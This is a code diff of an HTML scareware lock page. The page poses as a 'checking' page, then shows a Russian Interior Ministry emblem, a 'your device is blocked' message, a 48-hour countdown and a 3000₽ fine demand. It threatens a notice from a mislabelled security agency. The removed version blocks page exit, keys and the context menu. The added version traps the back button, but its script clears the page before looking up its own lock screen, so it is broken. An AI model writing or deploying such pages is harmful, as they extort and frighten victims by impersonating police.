@@ -3,124 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>about:blank</title>
+    <title>Проверка...</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
             background: white;
-            color: black;
-            overflow: hidden;
+            width: 100vw;
             height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            user-select: none;
         }
-        #lockScreen {
+        .hidden {
             display: none;
-            width: 100%;
-            height: 100vh;
+        }
+        .block-screen {
             position: fixed;
             top: 0;
             left: 0;
+            width: 100vw;
+            height: 100vh;
             background: black;
             color: white;
+            text-align: center;
+            padding: 20px;
             z-index: 9999;
-            cursor: default;
         }
-        h1 {
-            color: red;
-            font-size: 28px;
+        .block-screen img {
+            width: 120px;
         }
-        #timer {
-            font-size: 26px;
-            color: yellow;
+        .timer {
+            font-size: 48px;
             font-weight: bold;
+            margin-top: 20px;
         }
         .warning {
             font-size: 18px;
-            max-width: 600px;
-            margin: 20px auto;
-            background: rgba(255, 0, 0, 0.2);
-            padding: 10px;
-            border-radius: 10px;
-            border: 2px solid red;
-        }
-        input {
-            padding: 10px;
-            font-size: 18px;
-            text-align: center;
-            margin-top: 20px;
-            border: none;
-            border-radius: 5px;
-        }
-        img {
-            width: 150px;
-            margin-bottom: 10px;
+            margin-top: 10px;
         }
     </style>
 </head>
-<body onclick="activateLock()">
-    <div id="lockScreen">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7f/Emblem_of_the_Ministry_of_Internal_Affairs.svg/1280px-Emblem_of_the_Ministry_of_Internal_Affairs.svg.png" alt="MVD Logo">
-        <h1>ВАШЕ УСТРОЙСТВО ЗАБЛОКИРОВАНО</h1>
-        <p>Оставшееся время: <span id="timer">48:00:00</span></p>
-        <p>Оплата штрафа: <strong>3000₽</strong> (удваивается через 24 часа)</p>
+<body>
 
-        <div class="warning">
-            ⚠ При попытке выключения устройства штраф увеличивается, а после 48 часов будет отправлено уведомление от имени КНБ РФ с вашим скриншотом.
-        </div>
+<div class="block-screen hidden" id="blockScreen">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7f/Emblem_of_the_Ministry_of_Internal_Affairs.svg/1280px-Emblem_of_the_Ministry_of_Internal_Affairs.svg.png" alt="Герб">
+    <h1>ВАШЕ УСТРОЙСТВО ЗАБЛОКИРОВАНО</h1>
+    <div class="timer" id="timer">48:00:00</div>
+    <p class="warning">
+        При попытках выключения или перезагрузки устройства, счетчик будет уменьшаться на 1 час.  
+        Если штраф не оплачен в течение 24 часов, сумма штрафа удваивается.  
+        В случае неоплаты в течение 48 часов, на ваш контакт будет отправлено уведомление от имени КНБ Российской Федерации.
+    </p>
+</div>
 
-        <input type="password" id="password" placeholder="Введите код разблокировки">
-    </div>
+<script>
+    document.body.addEventListener("click", function () {
+        document.body.innerHTML = ""; // Очистка экрана
+        let blockScreen = document.getElementById("blockScreen");
+        blockScreen.classList.remove("hidden");
 
-    <script>
-        let timeLeft = 48 * 60 * 60; // 48 часов в секундах
-        let shutdownAttempts = 0;
-        let activated = false;
-
-        function updateTimer() {
-            let hours = Math.floor(timeLeft / 3600);
-            let minutes = Math.floor((timeLeft % 3600) / 60);
-            let seconds = timeLeft % 60;
-
-            document.getElementById("timer").innerText = 
-                String(hours).padStart(2, "0") + ":" + 
-                String(minutes).padStart(2, "0") + ":" + 
-                String(seconds).padStart(2, "0");
-
-            if (timeLeft <= 0) {
-                timeLeft = 48 * 60 * 60; // Новый таймер на 48 часов
-            }
-            timeLeft--;
-        }
-
-        function activateLock() {
-            if (!activated) {
-                document.body.style.display = "none";
-                document.getElementById("lockScreen").style.display = "flex";
-                activated = true;
-            }
-        }
-
-        function preventExit(event) {
-            event.preventDefault();
-            event.returnValue = "";
-        }
-
-        document.getElementById("password").addEventListener("input", function() {
-            if (this.value === "85748") {
-                window.location.href = "https://google.com"; // Выход из блокировки
-            }
+        // Принудительная блокировка страницы
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function () {
+            history.pushState(null, null, location.href);
         });
 
-        setInterval(updateTimer, 1000);
-        window.onbeforeunload = preventExit;
-        window.onkeydown = preventExit;
-        window.oncontextmenu = preventExit;
-    </script>
+        // Таймер
+        let timeLeft = 48 * 60 * 60; // 48 часов в секундах
+        function updateTimer() {
+            let hours = Math.floor(timeLeft / 3600).toString().padStart(2, '0');
+            let minutes = Math.floor((timeLeft % 3600) / 60).toString().padStart(2, '0');
+            let seconds = (timeLeft % 60).toString().padStart(2, '0');
+            document.getElementById("timer").innerText = `${hours}:${minutes}:${seconds}`;
+            timeLeft--;
+            if (timeLeft >= 0) {
+                setTimeout(updateTimer, 1000);
+            }
+        }
+        updateTimer();
+    });
+</script>
 
 </body>
 </html>
